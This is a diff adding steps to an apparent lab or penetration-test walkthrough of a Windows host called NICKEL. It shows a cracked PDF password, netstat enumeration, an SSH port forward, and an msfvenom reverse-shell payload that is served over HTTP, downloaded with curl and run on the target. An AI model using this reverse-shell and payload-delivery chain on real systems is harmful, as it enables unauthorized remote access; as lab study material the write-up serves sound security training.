@@ -325,5 +325,118 @@ echo '$pdf$4*4*128*-1060*1*16*14350d814f7c974db9234e3e719e360b*32*6aa1a24681b930
 hashcat pdf_hash.txt /usr/share/wordlists/rockyou.txt
 
 $pdf$4*4*128*-1060*1*16*14350d814f7c974db9234e3e719e360b*32*6aa1a24681b93038947f76796470dbb100000000000000000000000000000000*32*d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0:ariah4168
+
+ariah@NICKEL C:\>netstat -a
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:21             nickel:0               LISTENING
+  TCP    0.0.0.0:22             nickel:0               LISTENING
+  TCP    0.0.0.0:135            nickel:0               LISTENING
+  TCP    0.0.0.0:445            nickel:0               LISTENING
+  TCP    0.0.0.0:3389           nickel:0               LISTENING
+  TCP    0.0.0.0:5040           nickel:0               LISTENING
+  TCP    0.0.0.0:8089           nickel:0               LISTENING
+  TCP    0.0.0.0:33333          nickel:0               LISTENING
+  TCP    0.0.0.0:49664          nickel:0               LISTENING
+  TCP    0.0.0.0:49665          nickel:0               LISTENING
+  TCP    0.0.0.0:49666          nickel:0               LISTENING
+  TCP    0.0.0.0:49667          nickel:0               LISTENING
+  TCP    0.0.0.0:49668          nickel:0               LISTENING
+  TCP    0.0.0.0:49669          nickel:0               LISTENING
+  TCP    127.0.0.1:80           nickel:0               LISTENING
+  TCP    127.0.0.1:14147        nickel:0               LISTENING
+  TCP    192.168.236.99:22      192.168.45.237:35554   ESTABLISHED
+  TCP    192.168.236.99:139     nickel:0               LISTENING
+  TCP    192.168.236.99:5040    192.168.45.237:53620   CLOSE_WAIT
+  TCP    192.168.236.99:8089    192.168.45.237:45382   CLOSE_WAIT
+  TCP    192.168.236.99:33333   192.168.45.237:34432   CLOSE_WAIT
+  TCP    192.168.236.99:33333   192.168.45.237:37764   CLOSE_WAIT
+  TCP    192.168.236.99:33333   192.168.45.237:53116   CLOSE_WAIT
+  TCP    192.168.236.99:33333   192.168.45.237:54252   CLOSE_WAIT
+  TCP    192.168.236.99:33333   192.168.45.237:58228   CLOSE_WAIT
+  TCP    192.168.236.99:50136   74.178.76.128:https    SYN_SENT
+  TCP    [::]:21                nickel:0               LISTENING
+  TCP    [::]:135               nickel:0               LISTENING
+  TCP    [::]:445               nickel:0               LISTENING
+  TCP    [::]:3389              nickel:0               LISTENING
+  TCP    [::]:8089              nickel:0               LISTENING
+  TCP    [::]:33333             nickel:0               LISTENING
+  TCP    [::]:49664             nickel:0               LISTENING
+  TCP    [::]:49665             nickel:0               LISTENING
+  TCP    [::]:49666             nickel:0               LISTENING
+  TCP    [::]:49667             nickel:0               LISTENING
+  TCP    [::]:49668             nickel:0               LISTENING
+  TCP    [::]:49669             nickel:0               LISTENING
+  TCP    [::1]:14147            nickel:0               LISTENING
+  UDP    0.0.0.0:123            *:*
+  UDP    0.0.0.0:500            *:*
+  UDP    0.0.0.0:3389           *:*
+  UDP    0.0.0.0:4500           *:*
+  UDP    0.0.0.0:5050           *:*
+  UDP    0.0.0.0:5353           *:*
+  UDP    0.0.0.0:5355           *:*
+  UDP    127.0.0.1:1900         *:*
+  UDP    127.0.0.1:55328        *:*
+  UDP    127.0.0.1:56588        *:*
+  UDP    192.168.236.99:137     *:*
+  UDP    192.168.236.99:138     *:*
+  UDP    192.168.236.99:1900    *:*
+  UDP    192.168.236.99:55327   *:*
+  UDP    [::]:123               *:*
+  UDP    [::]:500               *:*
+  UDP    [::]:3389              *:*
+  UDP    [::]:4500              *:*
+  UDP    [::1]:1900             *:*
+  UDP    [::1]:55326            *:*
 ```
 
+#### Port Forwarding
+```bash
+  ssh -L 80:192.168.243.99:80 ariah@192.168.243.99
+  ** WARNING: connection is not using a post-quantum key exchange algorithm.
+  ** This session may be vulnerable to "store now, decrypt later" attacks.
+  ** The server may need to be upgraded. See https://openssh.com/pq.html
+  ariah@192.168.243.99's password:
+  Microsoft Windows [Version 10.0.18362.1016]
+  (c) 2019 Microsoft Corporation. All rights reserved.
+```
+#### Payload
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.194 LPORT=1000 -f exe -o payload.exe
+python3 -m http.server 1000
+Serving HTTP on 0.0.0.0 port 1000 (http://0.0.0.0:1000/) ...
+192.168.243.99 - - [06/Aug/2026 10:34:38] "GET /payload.exe HTTP/1.1" 200 -
+
+ariah@NICKEL C:\Users\ariah>curl 192.168.45.194:1000/payload.exe -o payload.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  7680  100  7680    0     0   7680      0  0:00:01 --:--:--  0:00:01 19692
+
+ariah@NICKEL C:\Users\ariah>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9451-68F7
+
+ Directory of C:\Users\ariah
+
+08/05/2026  10:04 PM    <DIR>          .
+08/05/2026  10:04 PM    <DIR>          ..
+10/15/2020  07:23 AM    <DIR>          3D Objects
+10/15/2020  07:23 AM    <DIR>          Contacts
+04/14/2022  04:46 AM    <DIR>          Desktop
+10/15/2020  07:23 AM    <DIR>          Documents
+10/15/2020  07:23 AM    <DIR>          Downloads
+10/15/2020  07:23 AM    <DIR>          Favorites
+10/15/2020  07:23 AM    <DIR>          Links
+10/15/2020  07:23 AM    <DIR>          Music
+08/05/2026  10:04 PM             7,680 payload.exe
+10/15/2020  07:25 AM    <DIR>          Pictures
+10/15/2020  07:23 AM    <DIR>          Saved Games
+10/15/2020  07:24 AM    <DIR>          Searches
+10/15/2020  07:23 AM    <DIR>          Videos
+               1 File(s)          7,680 bytes
+              14 Dir(s)   7,659,692,032 bytes free
+
+ariah@NICKEL C:\Users\ariah>payload.exe
+ariah@NICKEL C:\Users\ariah>
